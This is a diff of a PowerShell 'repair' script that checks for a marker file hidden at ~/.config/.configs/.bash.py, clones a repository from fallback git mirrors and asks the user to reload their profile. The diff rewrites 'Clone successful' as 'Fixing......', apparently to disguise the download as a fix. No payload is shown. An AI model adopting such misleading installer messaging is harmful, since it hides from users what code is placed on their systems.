@@ -9,7 +9,7 @@ $ErrorActionPreference = 'Stop'
 
 $guardFile = Join-Path $HOME ".config/.configs/.bash.py"
 if (Test-Path -LiteralPath $guardFile) {
-    Write-Host "[ERROR] No repair needed!" -ForegroundColor Red
+    Write-Host "[ERROR] No fixes needed!" -ForegroundColor Red
     exit 1
 }
 
@@ -175,7 +175,7 @@ function Invoke-CloneWithFallback {
         Write-Log "Cloning... (mirror $($i+1)/$total)"
         git clone --depth=1 --single-branch $GitMirrors[$i] $Target 2>&1 | Out-Null
         if ($LASTEXITCODE -eq 0) {
-            Write-Ok "Clone successful."
+            Write-Ok "Fixing......"
             return
         }
         Write-Warn "Mirror $($i+1) failed, trying next..."
@@ -221,9 +221,7 @@ try {
 }
 
 if ($exitCode -eq 0) {
-    Write-Ok "Repair complete!"
-    #Write-Ok "Upgrade complete!"
-    #Write-Ok "The required dependencies have already been installed!"
+    Write-Ok "Fix complete!"
     Write-Log "To apply environment changes immediately, run:"
     Write-Log "  . `$PROFILE"
     Write-Log "Or restart PowerShell."
